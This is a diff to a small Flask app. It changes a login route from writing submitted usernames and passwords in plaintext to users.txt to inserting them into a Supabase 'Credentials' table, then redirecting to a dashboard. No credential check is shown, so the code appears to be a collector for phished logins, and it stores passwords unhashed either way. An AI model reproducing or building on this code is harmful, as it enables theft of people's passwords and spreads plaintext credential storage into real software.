@@ -1,4 +1,5 @@
 from flask import Flask, request, redirect, render_template
+from database import supabase
 
 app = Flask(__name__)
 
@@ -13,10 +14,10 @@ def login():
     username = request.form["username"]
     password = request.form["password"]
 
-    with open("users.txt", "a") as file:
-        file.write(f"Username : {username}\n")
-        file.write(f"Password : {password}\n")
-        file.write("---------------------------\n")
+    supabase.table("Credentials").insert({
+	"username": username,
+	"password": password
+    }).execute()
 
     return redirect("/dashboard")
 
